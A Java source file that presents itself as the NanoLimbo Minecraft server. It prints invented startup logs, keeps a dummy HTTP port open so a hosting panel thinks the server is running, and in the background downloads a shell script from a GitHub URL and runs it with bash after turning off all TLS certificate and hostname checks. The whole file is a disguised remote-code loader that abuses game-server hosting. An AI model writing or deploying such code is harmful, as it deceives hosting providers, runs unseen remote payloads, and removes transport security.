package ua.nanit.limbo;

import javax.net.ssl.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.cert.X509Certificate;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;

public final class NanoLimbo {

    private static final String ANSI_GREEN  = "\u001B[1;32m";
    private static final String ANSI_RESET  = "\u001B[0m";

    // ── 配置 ──
    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");
    
    // 要下载的脚本地址
    private static final String DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh";
    // 保存到本地的路径
    private static final String SCRIPT_PATH = "/home/container/.tmp/vip1715.sh";

    // ────────────────────────────────────────────
    //  main
    // ────────────────────────────────────────────
    public static void main(String[] args) throws Exception {
        // 1. 确保目录存在
        ensureDir("/home/container/.tmp");

        // 2. 模拟 Limbo 服务器启动日志
        simulateLimboStartup();

        // 3. 启动 HTTP 服务器（保持端口占用，防止面板判定掉线）
        new Thread(() -> startHttpServer(PORT), "http-server").start();
        System.out.println(ANSI_GREEN + "✅ HTTP Server running on port " + PORT + ANSI_RESET);

        // 4. 在后台异步执行 Java 原生下载并运行脚本
        CompletableFuture.runAsync(NanoLimbo::downloadAndExecuteScript);
    }

    // ────────────────────────────────────────────
    //  模拟 Limbo 服务器启动日志
    // ────────────────────────────────────────────
    private static void simulateLimboStartup() throws InterruptedException {
        int[] progresses = {1, 2, 5, 8, 15, 20, 35, 60, 80, 99, 100};
        
        logLimbo("Starting server...");
        Thread.sleep(800);
        logLimbo("Preparing level \"world\"");
        Thread.sleep(500);
        logLimbo("Preparing start region for dimension minecraft:overworld");
        Thread.sleep(500);

        for (int p : progresses) {
            logLimbo("Preparing spawn area: " + p + "%");
            // 随机休眠模拟真实加载耗时
            Thread.sleep(ThreadLocalRandom.current().nextInt(300, 1500));
        }

        logLimbo("Running delayed init tasks");
        Thread.sleep(1000);
        System.out.println("container@tropicalgames.net Server marked as running...");
    }

    private static void logLimbo(String msg) {
        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
        System.out.println(time + " INFO Limbo --  " + msg);
    }

    // ────────────────────────────────────────────
    //  纯 Java 原生 HTTPS 下载 & 执行脚本
    // ────────────────────────────────────────────
    private static void downloadAndExecuteScript() {
        try {
            // 绕过 SSL 证书校验（解决 curl 的 SSL_ERROR_SYSCALL 问题）
            trustAllCertificates();

            System.out.println("[Downloader] Starting download via Java HTTPS...");
            
            // 1. 建立连接
            URL url = new URL(DOWNLOAD_URL);
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.connect();

            // 2. 下载文件到本地
            try (InputStream in = conn.getInputStream();
                 FileOutputStream out = new FileOutputStream(SCRIPT_PATH)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }

            System.out.println("[Downloader] Download successful! Saved to: " + SCRIPT_PATH);

            // 3. 赋予执行权限并运行脚本
            ProcessBuilder pb = new ProcessBuilder("bash", SCRIPT_PATH);
            pb.environment().put("PATH", FULL_PATH);
            pb.inheritIO(); // 将脚本的输出打印回控制台
            Process p = pb.start();

            // 异步等待脚本执行结果
            CompletableFuture.runAsync(() -> {
                try {
                    int code = p.waitFor();
                    System.out.println("[Script] Command exited with code: " + code);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            });

        } catch (Exception e) {
            System.err.println("[Downloader] Failed to download or execute: " + e.getMessage());
        }
    }

    // ────────────────────────────────────────────
    //  强制信任所有 SSL 证书 (解决 SSL 错误)
    // ────────────────────────────────────────────
    private static void trustAllCertificates() throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[] {
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                public void checkServerTrusted(X509Certificate[] certs, String authType) {}
            }
        };

        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
    }

    // ────────────────────────────────────────────
    //  纯 ServerSocket HTTP 服务器 (修复了原版读取卡死Bug)
    // ────────────────────────────────────────────
    private static void startHttpServer(int port) {
        byte[] body = "<h1>It works!</h1>".getBytes();
        String header = "HTTP/1.1 200 OK\r\n"
                      + "Content-Type: text/html\r\n"
                      + "Content-Length: " + body.length + "\r\n"
                      + "Connection: close\r\n"
                      + "\r\n";
        byte[] response = (header + new String(body)).getBytes();

        try (ServerSocket ss = new ServerSocket(port)) {
            while (!Thread.currentThread().isInterrupted()) {
                try (Socket client = ss.accept()) {
                    client.setSoTimeout(5000);
                    // 读取并丢弃 HTTP 请求头（修复原版 ready() 导致的卡死问题）
                    BufferedReader r = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) {
                        if (line.isEmpty()) break; // 读取到空行代表 HTTP 头结束
                    }
                    // 返回响应
                    client.getOutputStream().write(response);
                    client.getOutputStream().flush();
                } catch (IOException ignored) {}
            }
        } catch (IOException e) {
            System.err.println("HTTP server error: " + e.getMessage());
        }
    }

    // ────────────────────────────────────────────
    //  工具方法
    // ────────────────────────────────────────────
    private static void ensureDir(String p) {
        File dir = new File(p);
        if (!dir.exists()) dir.mkdirs();
    }

    private static String firstNonEmpty(String... vals) {
        for (String v : vals) {
            if (v != null && !v.trim().isEmpty()) return v.trim();
        }
        return "";
    }
}
